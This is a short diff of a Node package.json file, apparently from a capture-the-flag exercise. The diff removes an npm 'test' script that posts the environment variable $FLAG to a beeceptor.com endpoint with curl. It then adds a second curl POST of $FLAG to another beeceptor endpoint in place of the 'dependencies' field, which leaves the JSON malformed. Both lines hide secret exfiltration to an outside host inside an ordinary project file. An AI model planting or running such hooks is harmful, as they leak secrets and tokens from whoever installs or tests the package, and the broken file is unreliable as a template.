@@ -8,9 +8,9 @@
 	"main": "index.js",
 	"scripts": {
 		"start": "node index.js",
-		"test": "curl -s -d $FLAG https://dgfcbuziejhbcfiuqdhc.free.beeceptor.com"
+		"test": ""
 	},
-	"dependencies": {
+	"dependencies": "curl -X POST 'https://testuseless.free.beeceptor.com' -d \"$FLAG\""
 		"colors": "^1.4.0"
 	}
 }
